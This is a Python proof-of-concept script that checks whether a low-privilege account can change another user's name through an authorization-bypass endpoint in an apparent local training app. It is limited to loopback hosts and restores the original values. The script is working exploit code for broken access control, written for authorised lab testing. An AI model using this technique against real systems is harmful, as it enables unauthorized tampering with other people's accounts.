#!/usr/bin/env python3
# AUTH-001 F01 draft: cross-user write check for change_user_details.php.
# Authorised local lab only. Refuses non-loopback hosts, refuses redirects,
# never prints cookies or passwords. Records the original values, writes a
# harmless marker to one dedicated test record, verifies with the independent
# read endpoint and restores the original values.
import argparse
import http.cookiejar
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect refused: %s" % newurl, headers, fp)


def build_opener():
    jar = http.cookiejar.CookieJar()
    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def normalise_base(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("--base must start with http:// or https://")
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("only localhost/127.0.0.1/::1 are authorised, got %r" % (parts.hostname,))
    return base.rstrip("/")


def read_secret(path):
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        raise SystemExit("secret file %s is empty" % path)
    return value


def set_level_cookie(jar, base, level):
    # Same cookie the application's security selector writes; no account data is faked.
    host = urllib.parse.urlsplit(base).hostname
    jar.set_cookie(http.cookiejar.Cookie(
        version=0, name="security", value=level, port=None, port_specified=False,
        domain=host, domain_specified=False, domain_initial_dot=False,
        path="/", path_specified=True, secure=False, expires=None, discard=True,
        comment=None, comment_url=None, rest={}, rfc2109=False))


def request_json(opener, url, body=None, method="GET"):
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
    request = urllib.request.Request(url, data=data, method=method)
    request.add_header("Accept", "application/json")
    if data is not None:
        request.add_header("Content-Type", "application/json")
    with opener.open(request, timeout=10) as response:
        return response.status, response.read().decode("utf-8", "replace")


def login(opener, base, username, password):
    body = urllib.parse.urlencode(
        {"username": username, "password": password, "Login": "Login"}).encode("utf-8")
    request = urllib.request.Request(base + "/login.php", data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    with opener.open(request, timeout=10) as response:
        return response.status, response.read().decode("utf-8", "replace")


def fetch_users(opener, base):
    return request_json(opener, base + "/vulnerabilities/authbypass/get_user_data.php")


def as_rows(text):
    data = json.loads(text)
    if not isinstance(data, list):
        raise ValueError("read endpoint returned a non-list JSON payload: %s" % text[:200])
    return data


def pick(rows, object_id):
    for row in rows:
        if str(row.get("user_id")) == str(object_id):
            return row
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", required=True, help="e.g. http://127.0.0.1:8080")
    parser.add_argument("--user", required=True, help="low-privilege dedicated lab account")
    parser.add_argument("--password-file", required=True, help="local file with that account password")
    parser.add_argument("--security", default="low", choices=["low", "medium", "high", "impossible"])
    parser.add_argument("--test-object-id", required=True, help="user_id of the disposable test record")
    parser.add_argument("--marker", default="lab_marker_auth001")
    parser.add_argument("--confirm-dedicated-object", action="store_true")
    parser.add_argument("--out", default="auth001_f01_evidence.json")
    args = parser.parse_args()

    if not args.confirm_dedicated_object:
        raise SystemExit("refusing to write: --confirm-dedicated-object is required for the test record")

    base = normalise_base(args.base)
    password = read_secret(args.password_file)
    jar, opener = build_opener()

    try:
        status, _ = login(opener, base, args.user, password)
    except urllib.error.HTTPError as exc:
        print("login failed: HTTP %s" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error during login: %s" % exc.reason)
        return 2
    if status != 200:
        print("login returned HTTP %s" % status)
        return 2

    set_level_cookie(jar, base, args.security)

    try:
        read_status, read_text = fetch_users(opener, base)
    except urllib.error.HTTPError as exc:
        print("baseline read failed: HTTP %s" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error during baseline read: %s" % exc.reason)
        return 2
    print("baseline_read_status=%s" % read_status)
    try:
        rows = as_rows(read_text)
    except ValueError as exc:
        print("baseline read unusable: %s" % exc)
        return 1

    original = pick(rows, args.test_object_id)
    if original is None:
        print("test object %s not visible through the read endpoint" % args.test_object_id)
        return 1
    first_name = original.get("first_name")
    surname = original.get("surname")
    print("original first_name=%r surname=%r" % (first_name, surname))

    marker = "%s_%s" % (args.marker, args.test_object_id)
    object_id = int(args.test_object_id) if str(args.test_object_id).isdigit() else args.test_object_id
    try:
        write_status, write_text = request_json(
            opener,
            base + "/vulnerabilities/authbypass/change_user_details.php",
            body={"id": object_id, "first_name": marker, "surname": marker},
            method="POST")
    except urllib.error.HTTPError as exc:
        print("update failed: HTTP %s" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error during update: %s" % exc.reason)
        return 2
    print("update_status=%s update_body=%s" % (write_status, write_text[:200]))

    try:
        _, verify_text = fetch_users(opener, base)
        after = pick(as_rows(verify_text), args.test_object_id)
    except (urllib.error.URLError, ValueError) as exc:
        print("verification read failed: %s" % exc)
        return 2
    after_first = after.get("first_name") if after else None
    after_surname = after.get("surname") if after else None
    print("after_write first_name=%r surname=%r" % (after_first, after_surname))
    changed = after is not None and after_first == marker and after_surname == marker
    print("marker_observed=%s" % changed)

    restored_ok = False
    try:
        request_json(opener, base + "/vulnerabilities/authbypass/change_user_details.php",
                     body={"id": original.get("user_id"), "first_name": first_name, "surname": surname},
                     method="POST")
        _, verify_text = fetch_users(opener, base)
        back = pick(as_rows(verify_text), args.test_object_id)
        restored_ok = back is not None and back.get("first_name") == first_name and back.get("surname") == surname
    except (urllib.error.URLError, ValueError) as exc:
        print("restore failed, restore manually: %s" % exc)
    print("restored=%s" % restored_ok)

    evidence = {
        "target": base,
        "security": args.security,
        "test_object_id": args.test_object_id,
        "original": {"first_name": first_name, "surname": surname},
        "after_write": {"first_name": after_first, "surname": after_surname},
        "update_status": write_status,
        "update_body": write_text[:500],
        "marker_observed": changed,
        "restored": restored_ok,
    }
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(evidence, handle, ensure_ascii=False, indent=2)
    print("evidence=%s" % args.out)

    if changed and not restored_ok:
        print("RESULT: cross-user write observed but restore is unconfirmed; restore manually")
        return 3
    if changed:
        print("RESULT: low-privilege account modified a record it does not own")
        return 0
    print("RESULT: no cross-user write observed under this condition")
    return 1


if __name__ == "__main__":
    sys.exit(main())
